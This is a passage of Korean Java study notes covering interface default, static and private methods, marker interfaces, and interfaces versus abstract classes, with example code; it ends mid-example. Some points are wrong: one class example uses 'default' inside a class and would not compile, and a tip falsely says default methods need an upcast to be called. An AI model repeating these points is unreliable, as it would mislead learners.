public class Main {
    public static void main(String[] args){
        MyCalculator mycal = new MyCalculator();
        
        // 인터페이스 타입으로 업캐스팅
        Calculator cal = (Calculator) mycal; // 괄호 생략해도 됨

        // 인스턴스의 인터페이스 디폴트 메서드 호출
        int value = cal.sub(5, 10);
        System.out.println(value); // -5
    }
}

#)Tip
인터페이스의 디폴트 메서드를 호출하기 위해선, 객체의 타입이 반드시 인터페이스 타입으로
업캐스팅해야한다!!!
```
```
#) @implSpec 어노테이션
위에처럼 default method를 interface단에서 생성하는 것은 구현체모르게
추가기능을 만드는 것이기때문에 컴파일 에러가 아니더라도 런타임에러가 발생할 수 있는
리스크가 존재한다.

이러한 리스크를 조금이나마 감소시키기 위해 문서화작업이 필요하고
이때, 사용되는 어노테이션이 @implSpec

public interface CommonInterface{
	// 기존 요청사항에 따른 선언부
	void getName();

	/**
	* @implSpec name변수로 받은 값에 대해 대문자로 변환해주는 func
	*/
	default String getNameToUpperCase(){
		return getName().toUpperCase();
	}


//위와 같이 주석에 @implSpec을 통해 해당 method가 어떤 역할로 사용되는지
작성해주면 된다.
default method, static method는 모두 사용하는 방법은 동일하기 때문에 위에선 default method 위주로 테스트 코드를 작성했지만 static method도 동일한 방식으로 작성 및 사용하면 된다.
```
```
#) default 메소드 다중상속 문제
1. 다중 인터페이스들 간의 디폴트 메소드 충돌
- 애초에 똑같은 리폴트 메서드를 가진 두 인터페이스를 하나의 클래스에 구현하고 아무런
조치를 취하지 않으면 컴파일 자체가 되지 않는다.

- 인터페이스를 구현한 클래스에서 디폴트 메소드를 오버라이딩하여 하나로 통합한다.

interface A1{
    public void styleA();

    // 메소드 시그니처가 같은 디폴트 메서드
    default public void styleSame(){
        System.out.println("A1 인터페이스의 디폴트 메서드 입니다.");
    }
}

interface B1{
    public void styleB();

    // 메소드 시그니처가 같은 디폴트 메서드
    default public void styleSame(){
        System.out.println("B1 인터페이스의 디폴트 메서드 입니다.");
    }
}

class MultiInterface implements A1, B1 {
    @Override
    public void styleA() {}
    @Override
    public void styleB() {}

    // 두 인터페이스 디폴트 메서드중 A1 인터페이스의 디폴트 메서드를 오버라이딩 하여 구현
    default public void styleSame(){
        System.out.println("A1 인터페이스의 디폴트 메서드 입니다.");
    }
}

public class Main {
    public static void main(String[] args) {
        MultiInterface m1 = new MultiInterface();
        m1.styleSame(); // "A1 인터페이스의 디폴트 메서드 입니다."
    }
}
```
```
2. 인터페이스의 디폴트메소드와 부모클래스 메서드 간의 충돌

자식 클래스에서 인터페이스와 부모 클래스를 동시에 extends / implement 하였을때 디폴트 메서드와 인스턴스 메서드 간의 충돌을 가정한 상황이다.

이때는 부모 클래스의 메서드가 상속되고 디폴트 메서드는 무시된다.

만일 인터페이스 쪽의 디폴트 메서드를 사용할 필요가 있다면, 필요한 쪽의 메서드와 같은 내용으로 그냥 오버라이딩 해버리면 된다.


interface A1{
    public void styleA();

    // C1 클래스와 메소드 시그니처가 같은 디폴트 메서드
    default public void styleSame() {
        System.out.println("A1 인터페이스의 디폴트 메서드 입니다.");
    }
}

abstract class C1 {
    // A1 인터페이스와 메소드 시그니처가 같은 인스턴스 메서드
    public void styleSame() {
        System.out.println("C1 클래스의 인스턴스 메서드 입니다.");
    }
}

// 메서드 시그니처가 같은 두 추상화들을 동시에 상속
class MultiClassInterface extends C1 implements A1 {
    @Override
    public void styleA() {}
}

public class Main {
    public static void main(String[] args) {
        MultiClassInterface m1 = new MultiClassInterface();
        m1.styleSame(); // "C1 클래스의 인스턴스 메서드 입니다." - 클래스의 메서드 시그니처가 우선되어 적용됨

        // 마찬가지로 인터페이스 타입으로 다운캐스팅 해도 클래스 인스턴스 메서드로 호출 됨
        ((A1) m1).styleSame(); // "C1 클래스의 인스턴스 메서드 입니다."
    }
}
```
```
//디폴트메소드를 쓰고 싶을 경우
// 메서드 시그니처가 같은 두 추상화들을 동시에 상속
class MultiClassInterface extends C1 implements A1 {
    @Override
    public void styleA() {}
    //이게 위와 차이점이다.
    // 클래스의 인스턴스 메서드를 무시하고 인터페이스의 디폴트 메서드를 사용하기 위해 그대로 오버라이딩
    public void styleSame() {
        System.out.println("A1 인터페이스의 디폴트 메서드 입니다.");
    }
}

public class Main {
    public static void main(String[] args) {
        MultiClassInterface m1 = new MultiClassInterface();
        m1.styleSame(); // "A1 인터페이스의 디폴트 메서드 입니다."
    }
}
```
```
#) default 메소드의 super
상위 클래스를 상속하고 상위의 메소드를 오버라이딩하여 재정의하였을때, 만일 부모 메서드를 호출할 일이 생긴하면 super 키워드를 통해 부모 메서드를 호출할 수 있었다.

이와 같이 인터페이스도 디폴트 메서드를 구현한 클래스에서 오버라이딩 하였을때, super 키워드를 통해 인터페이스의 원래의 디폴트 메서드를 호출이 가능하다.

다만 문법이 클래스 방식과 약간 차이가 있다. 
인터페이스의 super는 다음과 같은 구성으로 호출된다. -> 인터페이스명.super.디폴트메서드

interface IPrint{
    default void print(){
        System.out.println("인터페이스의 디폴트 메서드 입니다.");
    }
}

class MyClass implements IPrint {
    @Override
    public void print() {
        IPrint.super.print(); // 인터페이스의 super 메서드를 호출
        System.out.println("인터페이스의 디폴트 메서드를 오버라이딩한 메서드 입니다.");
    }
}

public class Main {
    public static void main(String[] args) {
        MyClass cls = new MyClass();
        cls.print();
    }
}

//출력
인터페이스의 디폴트 메소드입니다.
인터페이스의 디폴트 메서드를 오버라이딩한 메소드입니다.
```
```
#)static 메소드
- 인스턴스 생성과 상관없이 인터페이스 타입으로 접근해 사용할 수 있는 메서드
- 인터페이스 전용 static 메소드라해서 특별한 것은없다.
  일반 클래스의 static 메서드와 다를 바 없다.(똑같이 취급하면 된다.)

interface Calculator {
    public int plus(int i, int j);
    public int multiple(int i, int j);

    // 디폴트 메서드
    default int sub(int i, int j){
        return i - j;
    }

    // 스태틱 메서드
    public static void explain(){
        System.out.println("interface static 메서드 입니다. 이 인터페이스는 pluc, multipe, sub 기능을 제공하는 메서드를 지니고 있습니다. (설명)");   
    }
}

class MyCalculator implements Calculator {
    @Override
    public int plus(int i, int j) {  return i + j; }
    @Override
    public int multiple(int i, int j) { return i * j; }
}

public class Main {
    public static void main(String[] args){
        // 클래스 처럼 static 메소드 호출 하면 된다.
        Calculator.explain(); // "interface static 메서드 입니다. 이 인터페이스는 plus, multiple, sub 기능을 제공하는 메서드를 지니고 있습니다. (설명)"
    }
}
```
```
#) private 메소드
- 자바 9버전에 추가된 메서드
- 인터페이스에 default, static 메서드가 생긴 이후, 이러한 메소드들의 로직을 공통화하고 재사용하기 위해 생김
- private 메서드도 구현부를 가져야한다.
- 단, private 메소드는 인터페이스 내부에서만 돌아가는 코드이다. (인터페이스를 구현한 클래스에서
사용하거나 재정의할 수 없음)
- 따라서 인터페이스 내부에서 private 메소드를 호출할때, default 메소드 내부에서 호출해야 하며,만일 private static 키워드를 붙인 메소드는 static 메소드에서만 호출이 가능하다.


#) Tip
어렵게 생각할 필요없이, 클래스에서도 private 접근제어자를 가진 메서드를 정의하였을때, 호출 메서드에서 private 내부 메서드를 호출하여 사용하는 식 이었던 것 처럼, 인터페이스도 어렵지 않게 똑같이 생각하면 된다.단, 인터페이스는 클래스가 아니기 때문에 this 키워드를 사용할순 없다.


interface Calculator {
    public int plus(int i, int j);
    public int multiple(int i, int j);

    // private 메서드
    private void printf() {
        System.out.println("private 메서드는 default 내부에서만 호출이 가능합니다.");
    }

    // private 스태틱 메서드
    private static void printfStatic() {
        System.out.println("private static 메서드는 static 메서드 내부에서만 호출이 가능합니다.");
    }

    // 디폴트 메서드
    default void callPrivate() {
        printf(); // private 메서드 호출
    }

    // 스태틱 메서드
    static void callPrivateStatic() {
        printfStatic(); // private 스태틱 메서드 호출
    }
}

class MyCalculator implements Calculator {
    @Override
    public int plus(int i, int j) {  return i + j; }
    @Override
    public int multiple(int i, int j) { return i * j; }
}

public class Main {
    public static void main(String[] args){
        // 인터페이스 디폴트 메서드를 통한 private 메서드 호출
        Calculator c = new MyCalculator(); // 인터페이스 타입으로 업캐스팅
        c.callPrivate(); // "private 메서드는 default 내부에서만 호출이 가능합니다."

        // 인터페이스 스태틱 메서드를 통한 private static 메서드 호출
        Calculator.callPrivateStatic(); // "private static 메서드는 static 메서드 내부에서만 호출이 가능합니다."
    }
}
```
```
#) info
인터페이스의 상수는 private으로 만들 수 없다.인터페이스는 실제 객체는 아니지만 서로 간의 약속으로 사용된다. 정해진 약속을 한 쪽에서 일방적으로 수정하게 되면 문제가 발생할 수 있다. 따라서 인터페이스에 선언하는 필드들은 자동으로 public static final 완벽한 상수가 된다.
```
```
#) 인터페이스의 활용도
1. 인터페이스 다형성

interface Keyboard { }

class Logitec_Keyboard implements Keyboard { }

class Samsung_Keyboard implements Keyboard { }

class Apple_Keyboard implements Keyboard { }

public class Main {
    public static void main(String[] args) {
    	// 인터페이스 타입 배열로 여러가지 클래스들을 한번에 타입 묶음을 할 수 있다.
        Keyboard[] k = {
                new Logitec_Keyboard(),
                new Samsung_Keyboard(),
                new Apple_Keyboard(),
        };
    }
}

또한 인터페이스를 자료형으로 쓰는 습관들이면 프로그램이 유용해진다고 하는데
그 의미가 객체는 클래스가 아닌 인터페이스로 참조하라는 의미이다.
```
```
예를들어 중복이 없는 집합 자료형을 사용하기 위해 LinkedHashSet 클래스를 초기화 하려할때,
이때 객체의 타입을 똑같이 LinkedHashSet으로 하지말고 인터페이스인 Set타입으로 설정하여 선언하는 것이다.

// 나쁜 예) 클래스를 바로 타입으로 사용했다.
LinkedHashSet<Object> s = new LinkedHashSet<>();

// 좋은 예) 인터페이스를 타입으로 사용했다.
Set<Object> s = new LinkedHashSet<>();


이런식으로 구현을 하면 변수에 담긴 구현 클래스를 다른 Set자료형 클래스로 교체하고자 할때
그저 새클래스의 생성자를 다시 호출해주기만 하면 된다.

// 본래 LinkedHashSet으로 구현하였다가 사정이 생겨 TreeSet클래스로 변경해야한다고 하면, 그냥 인터페이스 타입의 변수에 재할당만 하면 된다(인터페이스Set이 다 포함하고있으니)
Set<Object> s = new LinkedHashSet<>();
s = new TreeSet<>();
```
```
마지막으로 무엇보다 인터페이스의 다형성의 가장 큰 특징은 바로 다중 구현을 통한 자유로운 상속 관계를 만들어 클래스의 다형성보다 더욱 다채롭게 그리고 자유롭게 사용이 가능하다는 것이다.

아무래도 클래스의 다형성은 기본적으로 클래스의 상속에 기반을 두기 때문에, 클래스 상속은 한번밖에 안되며 또한 클래스끼리 의미있는 연관 관계가 있어야 되어 여러모로 제약이 많다. 그러나 인터페이스는 언제어디서나 마음대로 implements를 여러개 추가하거나 빼거나 할 수 있으니 제약으로부터 많이 자유로워 진다.

이를 이용한 예시가 바로 다음에 소개할 클래스끼리 형제 관계를 맺게 해주거나 상속을 넘어선 타입 제한도 가능하게 된다.
```

```
#)형제관계를 맺어줌
기본적으로 자바의 클래스 상속구조는 부모-자식 관계로만 가능하다.
그래서, 사용하는 클래스들이 각기 다른 부모클래스를 상속하고있는 상황이면 위의 자료형 타입 통합 할수없다.

하지만 인터페이스는 클래스 상속관계와는 달리, 하나의 기능에 대한 약속이기때문에 어떤 객체이든
그 약속을 지키기만 한다면 필요한 곳에서 사용 가능

그리고 인터페이스는 다중 상속에 대해 제약을 받지 않기 때문에, 일부만 묶고 싶은 클래스들을 implements 키워드로 등록시키면, 각기 다른 부모클래스를 상속하고 있는 자식 클래스에 인터페이스를 구현(상속) 시켜줌으로써 형제 클래스 끼리 묶는 타입 통합을 이루어 낼수 있는 것이다.
즉, 아무 관계도 없는 클래스들에게 하나의 인터페이스를 공통적으로 구현하도록 함으로써 관계를 맺어줄 수 있다. 
 
예를 들어 각기 다른 부모 클래스를 상속하고 있는 Soccer 클래스와 BassGuitar 클래스를 하나의 타입으로 묶어서 사용할 필요가 있을때, 인터페이스를 implements 함으로써 마치 Soccer 와 BassGuitar 클래스를 묶은 형제 클래스 타입 IBehavior 를 만든것과 같다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/12.PNG" width="650" height="400" /><br><br>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/13.PNG" width="650" height="500" /><br><br>

```
#)타입 접근제한
이외에도 인터페이스는 일종의 접근제한 역할도 할 수 있다.

이는 위의 형제 관계 역할과 매우 비슷한 개념인데, 만일 똑같은 부모를 상속하고 있는 3개의 자식들중, 2개의 자식 클래스 타입만 받을 수 있는 메서드를 구현한다고 했을때 이용된다.
다형성이랍시고 부모 클래스 타입으로 파라미터를 받아버리면, 모든 자식 클래스가 접근이 가능하지 때문에 제한이 되지 않기 때문이다.
 
이 부분은 바로 코드 예시를 보는 것이 훨씬 이해하기 쉬울 수 있다.
다음과 같이 스타크래프트를 구성하기 위해 Marine, SCV, Tank 클래스를 만들고 이들을 공통으로 묶을 부모 클래스 GroundUnit 클래스로 상속 관계를 맺어 주었다.
그리고 repair() 메서드에서 중복을 줄이기 위한 다형성 기법으로 매개변수 타입을 GroundUnit 부모 클래스 타입으로 받도록 설정 하였다.

class GroundUnit { }

class Marine extends GroundUnit{ }
class SCV extends GroundUnit{ }
class Tank extends GroundUnit{ }

public class Main {
    public static void main(String[] args) {   
        repair(new Marine());
    }
    
    static void repair(GroundUnit gu) { //타입이 마린도 들어갈수있네..
        // 마린은 기계가 아니기 때문에 수리는 불가능 하다. 하지만 상속 관계상 마린 클래스 타입이 들어와 실행될 수 있는 위험성이 존재한다.
    }
}

//그래서 3개의 자식중 2개의 자식만 머신이라는 타입으로 형제타입관계를 맺어주면서 동시에
다른 타입의 접근제할 역할도 해낸것이다.(마린이 못들어오게)

interface Machine { } // SCV, Tank 클래스를 통합한 타입으로 이용하는 인터페이스

class GroundUnit { }
//인터페이스 implements의 차이만 있다.
class Marine extends GroundUnit{ } 
class SCV extends GroundUnit implements Machine{ }
class Tank extends GroundUnit implements Machine{ }

public class Main {
    public static void main(String[] args) {
        repair(new Marine()); // ! ERROR
    }

    static void repair(Machine gu) {
        // SVG와 탱크 타입만 받을 수 있게 인터페이스를 타입으로 하여 다형성을 적용
    }
}
```
```
#)메서드 접근제한
이밖에도 객체에서 사용할 수 있는 메서드를 제한하는 효과도 있는데,
예를들어 A,B,C라는 인터페이스를 구현한 클래스를 반환할 때 A타입으로 반환하게되면 외부에서는
A인터페이스의 메소드만 보이게된다.
따라서 별도의 접근 제한을 이용하지 않고도 사용할 수 있는 메서드 접근 제한과 마찬가지 효과를 보게하는 방법

이런이유로 오히려 거꾸로 클래스에 여러가지 메소드를 만들어 둔 다음 인터페이스로 분리하는 작업을 진행하는 경우가 가끔있다.

interface PlayMovie {
    void play();
}
interface ViewImage {
    void view();
}
interface VolumeUpDown {
    void volume();
}

class MP3 implements PlayMovie, ViewImage, VolumeUpDown {
    public void play() {}
    public void view() {}
    public void volume() {}
}

public class Main {
    public static void main(String[] args) {
        PlayMovie mp3 = new MP3(); // 3개의 구현한 인터페이스중 하나로 객체 선언
        mp3.play(); // 인터페이스를 여러개 implements하여도 play() 이외의 메소드는 제한된다.
    }
}
```

```
#)인터페이스 타입으로 통신
아래 ServiceLogic 클래스의 메소드 printInt() 를 보면 파라미터로 MapStore 클래스 타입을 받아 MapStore 클래스의 메서드를 실행해 값을 얻고 출력하는 로직으로 구성되어 있다.

이러한 형태를 ServiceLogic 클래스는 MapStore 클래스에 의존적이다 라고 말한다. 왜냐하면 MapStore 클래스가 잘못되면 ServiceLogic 클래스의 메서드는 동작하지 않을 것이기 때문이다. 

//클래스를 두개 이용시에
class ServiceLogic {
    // ServiceLogic 클래스의 메소드는 MapStore 클래스를 사용하기 때문에, ServiceLogic 는 MapStore 에 의존적이다.
    public void printInt(MapStore cls) { // 지정한 클래스 타입만 받음
        int num = cls.getNum() * 2;
        System.out.println(num);
    }
}

class MapStore {
    private int num = 10;

    public int getNum() {
        return this.num;
    }
}
```
```
따라서 이러한 의존성 관계를 없애기 위해 ClubStore 인터페이스를 만들고 MapStore 클래스에 implements 하여 구현한다. 그러면 ServiceLogic 클래스에서 만일 MapStore 객체 데이터를 사용할 일이 생길경우, 직접 MapStore 객체를 사용하는게 아닌 오로지 ClubStore 인터페이스를 이용해 통신함으로써 클래스 간의 의존성을 없앨 수 있는 것이다.
이것을 변경에 유리한 유연한 설계라고도 한다.

interface ClubStore {
    int getNum(); // 인터페이스 타입 상태의 객체에서 메서드를 사용하기 위해선 인터페이스에도 추상 메서드 형태로 넣어져 있어야 한다.
}

class ServiceLogic {
    // ServiceLogic 클래스의 메소드는 ClubStore 인터페이스를 사용함으로써 클래스 간의 의존성을 없앴다.
    public void printInt(ClubStore cls) { 
        int num = cls.getNum() * 2;
        System.out.println(num);
    }
}

class MapStore implements ClubStore{
    private int num = 10;
	//인터페이스의 메서드를 구현
    public int getNum() {
        return this.num;
    }
}
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/14.PNG" width="650" height="500" /><br><br>

```
#)마커인터페이스
빈껍데기 인터페이스를 말한다.
interface aaa {

}

인터페이스를 자유롭게 다중상속이 가능하다는 점에서 착안하여 사용
아무내용이 없어 쓸모가 없어보이지만, 마커인터페이스의 역할은 객체의 타입과 관련된 정보만을 제공

따라서 컴파일러와 JVM은 이 마커인터페이스를 통해 객체에 대한 추가적인 정보를 얻을 수 있다.

상위 클래스 Animal을 만들고 그 하위들로 Lion, Chicken, Snake ...등 여러가지 동물 클래스들을 만들어 상속 관계를 맺었다. 이때 born 이라는 메서드에서 Animal 타입의 매개변수를 받고 새끼를 낳는 동물인지 알을 낳는 동물인지 구분하기 위해 일일히 instanceof 연산자로 클래스 타입을 구분하였다.

class Animal {
    public static void born(Animal a) {
        if(a instanceof Lion) {
            System.out.println("새끼를 낳았습니다.");
        } else if(a instanceof Chicken) {
            System.out.println("알을 낳았습니다.");
        } else if(a instanceof Snake) {
            System.out.println("알을 낳았습니다.");
        }
        // ...
    }
}

class Lion extends Animal { }
class Chicken extends Animal { }
class Snake extends Animal { }

이러한방식은 자식클래스 개수가 많아지면 복잡해진다.

따라서 아무런 내용이 없는 빈 껍데기 인터페이스를 선언하고 적절한 클래스에 implements 시킴으로써, 추상화, 다형성 이런걸 떠나서 그냥 단순한 타입 체크용으로 사용하는 것이다.
그러면 조건문 코드도 다음과 같이 심플해질 수 있다.

// 새끼를 낳을 수 있다는 표식 역할을 해주는 마커 인터페이스(빈깡통)
interface Breedable {}

class Animal {
    public static void born(Animal a) {
        if(a instanceof Breedable) {
            System.out.println("새끼를 낳았습니다.");
        } else {
            System.out.println("알을 낳았습니다.");
        }
    }
}

class Lion extends Animal implements Breedable { }
class Chicken extends Animal { }
class Snake extends Animal { }


TIP) 이러한 마커인터페이스의 대표적인 자바 인터페이스로는 Serializable, Cloneable이 있다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/15.PNG" width="650" height="500" /><br><br>

```
#)인터페이스 정리
- 내부의 모든메서드는 public abstract 로 정의 (default 메서드 제외)
- 내부의 모든 필드는 public static final 상수
- 클래스에 다중구현 지원
- 인터페이스끼리는 다중상속 지원
- 인터페이스에도 static, default, private 제어자를 붙여 클래스 같이 구체적인 메서드를 가질 수 있음.따라서 하위 멤버의 중복 메서드 통합을 어느정도 할수는 있겠지만, 필드는 상수이기 때문에 중복 필드 통합은 불가능
- 인터페이스는 부모 자식 관계인 상속에 얽매이지 않고, 공통 기능이 필요할 때마다 추상 메서드를 정의해놓고 구현(implement)하는 식으로 추상클래스보다 자유롭게 붙였다 땟다 사용
- 인터페이스는 클래스와 별도로 구현 객체가 같은 동작을 한다는 것을 보장하기 위해 사용하는 것에 초점
- 다중 구현이 된다는 점을 이용해, 내부 멤버가 없는 빈 껍데기 인터페이스를 선언하여 마커 인터페이스 로서 이용 가능
- 보통 xxxable 이런 형식으로 인터페이스 네이밍 규칙을 따름
```
```
#)추상클래스 정리
- 추상클래스는 하위 클래스들의 공통점들을 모아 추상화하여 만든 클래스
- 추상클래스는 다중 상속이 불가능하여 단일 상속만 허용한다.
- 추상클래스는 추상 메소드 외에 일반클래스와 같이 일반적인 필드, 메서드, 생성자를 가질수 있다.
이러한 특징으로, 추상클래스는 추상화(추상 메서드)를 하면서 중복되는 클래스 멤버들을 통합 및 확장을 할 수 있다.
- 같은 추상화인 인터페이스와 다른점은, 추상클래스는 클래스간의 연관 관계를 구축하는 것에 초점을 둔다.
```

```
#)인터페이스 vs 추상화
인터페이스나 추상클래스나 둘이 똑같이 추상 메소드를 통해 상속/구현을 통한 메소드 강제 구현 규칙을 가지는 추상화 클래스이다.

다만 이 둘은 각각 고유의 몇몇 특징들을 가지고 있는데, 이러한 특징으로 인해 각각 사용처가 갈리게 된다. 또한 기능적인 부분 뿐만 아니라 인터페이스와 추상클래스가 내포하고있는 논리적인 의미로서도 사용처가 나뉜다.

예를들어 이 둘은 대표적으로 '다중 상속' 기능 여부의 차이가 있지만, 이것이 포인트가 아니라 이에 따른 사용 목적이 다르다는 것에 포인트를 맞춰야 한다.

인터페이스 : implements 라는 키워드처럼 인터페이스에 정의된 메서드를 각 클래스의 목적에 맞게 기능을 구현하는 느낌

추상 클래스 : extends 키워드를 사용해서 자신의 기능들을 하위 클래스로 확장 시키는 느낌
```
```
#)추상클래스 사용하는 경우
- 상속 받을 클래스들이 공통으로 가지는 메소드와 필드가 많아 중복 멤버 통합을 할때
- 멤버에 public 이외의 접근자(protected, private) 선언이 필요한 경우
- non-static, non-final 필드 선언이 필요한 경우 (각 인스턴스에서 상태 변경을 위한 메소드가 필요한 경우)
- 요구사항과 함께 구현 세부 정보의 일부 기능만 지정했을 때
- 하위 클래스가 오버라이드하여 재정의하는 기능들을 공유하기 위한 상속 개념을 사용할 때
- 추상 클래스는 이를 상속할 각 객체들의 공통점을 찾아 추상화시켜 놓은 것으로, 상속 관계를 타고 올라갔을 때 같은 부모 클래스를 상속하며 부모 클래스가 가진 기능들을 구현해야할 경우 사용한다.
```

```
#)중복멤버통합
중복되는 멤버를 통합해주는 기능은 본래 추상클래스의 기능이라기보다는 그냥 클래스자체의 기능이다.

근데, 인터페이스랑 차이가 있는것이 상수밖에 정의못하는 인터페이스에서는 할수없는 기능이 추상클래스
중복멤버통합이라고 보면된다.

class NewlecExam {
    int kor; // 중복되는 멤버
    int eng; // 중복되는 멤버
    int math; // 중복되는 멤버
    int com;

    void total(){} // 중복되는 멤버
    void avg(){} // 중복되는 멤버
}

class YBMExam{
    int kor; // 중복되는 멤버
    int eng; // 중복되는 멤버
    int math; // 중복되는 멤버
    int toeic;

    void total(){} // 중복되는 멤버
    void avg(){} // 중복되는 멤버
}
```
```
위의 국어,영어,수학 멤버필드를 상속을 통해 상위클래스로 묶고, 메서드도 통합하여 추상화해준다.
이러면 나중에 다른 종류의 Exam 클래스를 추가/확장하는데 있어 유연하다.
//공통되는것들을 추상화
abstract class Exam {
    int kor;
    int eng;
    int math;

    abstract void total();
    abstract void avg();
}

class NewlecExam extends Exam {
    int com;

    void total(){}
    void avg(){}
}

class YBMExam extends Exam {
    int toeic;

    void total(){}
    void avg(){}
}
```
```
#)추상클래스의 다형성 이용설계
추상클래스의 다형성이나 인터페이스의 다형성이나 둘이 클래스 타입을 통합한다는 취지는 같다.

다만, 언제 상황에 다형성을 사용하느냐에 따른 순서차이다.

추상클래스는 클라이언트(ExamConsole)에서 자료형을 사용하기전에 미리 논리적인 클래스 상속구조를
만들어놓고 사용이 결정되는 느낌이다.

예를들어 위의 Exam주제의 논리적인 상속 구조의 객체들을 클라이언트(ExamConsole)에서 다형성으로
통합적으로 받아 사용할 때, 필드로 추상클래스타입으로 선언하고 생성자에서 매개변수로
new NewlectExam 또는 new YBMExam() 객체로 받아와 업캐스팅으로 초기화함으로써,
다양한 Exam 자식클래스들을 다형성으로 다룰 수 있게된다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/16.PNG" width="650" height="500" /><br><br>

```
#)명확한 계층 구조 추상화
단순한 중복 멤버 제거를 떠나서, 클래스끼리 명확한 계층구조가 필요할때도 추상클래스를 사용한다.

공통된 기능 구현이 필요하거나, 공통으로 지켜야 할 규칙도 있을때 상속을 통해 구조화 하여 재정의(overriding)을 통해 구현한다.

이는 기능이라기 보단 설계 원칙 이론에 가까운데, 아직 객체 지향의 추상화에 익숙하지 않으면, 인터페이스와의 차이점이 애매해 잘 와닿지 않은 부분일 수도 있다. (이론이란 원래 그런거니까)

기억해야 할 부분은 추상클래스나 인터페이스나 추상 메소드를 이용한 구현 원칙을 강제한다는 점은 같지만, 추상클래스는 '클래스로서' 클래스와 의미있는 연관 관계를 구축할때 사용된다라고 보면 된다.
의미있는 연관 관계란, 부모와 자식 간의 논리적으로 묶여있는 관계라고 보면 된다. 

삼각형, 원, 마름모를 도형이라는 관계로 묶거나, 사자, 호랑이, 고양이를 동물이라는 관계로 묶는, 단어 그 자체에 논리성과 의미성이 있는 연관 관계로 떠올리면 된다.
```

```
예를들어, 대용량 SMS sender를 구현하는데 여러 통신사들이 다른 통신탑(tower)을 갖고 있어서
접속하는데 있어 각각 다른 구현이 필요하며(establish Connection With Your Tower), 
공통으로
지켜야할 규칙인 방해금지모드(check If Do Not Disturb Mode)도 있는 스펙일때 먼저 추상클래스로
공통분모들을 추상화로 구현하고, 상속을 통해 여러 통신사 클래스를 확장하여 구현하는 식으로 구성

/* SMS를 보내는 추상화된 코드 */
abstract class SMSSender {

	//상속받는 클래스마다 구현하는내용이 다르니까 추상화
    abstract public void establishConnectionWithYourTower();

    public void sendSMS() {
        establishConnectionWithYourTower();
        checkIfDoNotDisturbMode();
        // ...
        destroyConnectionWithYourTower();
    }

    abstract public void destroyConnectionWithYourTower();

    public void checkIfDoNotDisturbMode() {
        // 추상 클래스 안에서 구현(공통으로 지켜야할 함수니까 추상화안씀)
    }
}
/* SMSSender를 통신사 클래스들이 상속 */
class SKT extends SMSSender {
    @Override
    public void establishConnectionWithYourTower() {
        // SKT 방식으로 커넥션 맺기
    }

    @Override
    public void destroyConnectionWithYourTower() {
        // SKT 방식으로 커넥션 종료
    }
}

class LG extends SMSSender {
    @Override
    public void establishConnectionWithYourTower() {
        // LG 방식으로 커넥션 맺기
    }

    @Override
    public void destroyConnectionWithYourTower() {
        // LG 방식으로 커넥션 종료
    }
}
```
```
#)인터페이스를 사용하는 경우
- 어플리케이션의 기능을 정의해야 하지만 그 구현 방식이나 대상에 대해 추상화 할 때
- 서로 관련성이 없는 클래스들을 묶어 주고 싶을때 (형제 관계)
- 다중 상속(구현)을 통한 추상화 설계를 해야할때
- 특정 데이터 타입의 행동을 명시하고 싶은데, 어디서 그 행동이 구현되는지는 신경쓰지 않는 경우
- 클래스와 별도로 구현 객체가 같은 동작을 한다는 것을 보장하기 위해 사용

```
```
#)자유로운 타입 묶음
인터페이스의 가장 큰 특징은 상속에 구애 받지 않은 상속(구현) 가 가능하다는 것이다.

상속(extends)는 뭔가 클래스끼리 논리적인 타입 묶음의 의미가 있다면, 구현(implements)은 자유로운 타입 묶음의 의미이다. 그래서 서로 논리적이지 않고 관련이 적은 클래스끼리 필요에 의해 형제 타입 처럼 묶어 버릴 수 있다.
 
다음과 같이 Creature 라는 최상위 추상 클래스와 그 하위 추상 클래스인 Animal, Fish 가 있고, 각 추상 클래스를 구체적으로 의미 부여해 구현한 Parrot, Tiger, People 클래스와 Whale 클래스가 있다고 가정하자.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/17.PNG" width="650" height="500" /><br><br>

```
위의 상속관계를 코드로 표현

// 추상 클래스 (조상 클래스)
abstract class Creature { }

// 추상 클래스 (부모 클래스)
abstract class Animal extends Creature { }
abstract class Fish extends Creature { }

// 자식 클래스
class Parrot extends Animal { }
class Tiger extends Animal { }
class People extends Animal { }

class Whale extends Fish { }

이렇게 상속 관계를 설정해 놓고 동작을 하는 메소드를 추가해야 하는데, 만일 수영 동작을 하는 swimming() 메소드를 각 자식 클래스에 추가해야 한다고 하자.

이때 나중에 확장을 위해 추상화 원칙을 따라야 한다고 한다. 그러면 부모나 조상 클래스에 추상 메소드를 추가해야 하는데, 수영은 고래(Whale) 과 사람(People)만 할수 있으니 이를 동시에 포함하는 Creature 추상 클래스에서 추상 메소드를 추가해야 한다. (호랑이와 앵무새는 수영을 못한다고 가정한다)
 
하지만 Creature 추상 클래스에 추상 메소드를 추가하면, 곧 이를 상속하는 모든 자손/자식 클래스에서 반드시 메소드를 구체화 해야한다는 규칙 때문에 실제로 수영을 못하는 호랑이(Tiger)와 앵무새(Parrot) 클래스에서도 메소드를 구현해야 하는 강제성이 생기게 된다.


// 추상 클래스 (조상 클래스)
abstract class Creature { 
	abstract void swimming(); // 수영 동작을 하는 추상 메소드
}

// 추상 클래스 (부모 클래스)
abstract class Animal extends Creature { }
abstract class Fish extends Creature { }

// 자식 클래스
class Parrot extends Animal {
	void swimming() {} // 앵무새는 수영을 할수 없지만 상속 관계로 인해 강제적으로 메소드를 구현해야하는 사태가 일어난다.
}
class Tiger extends Animal {
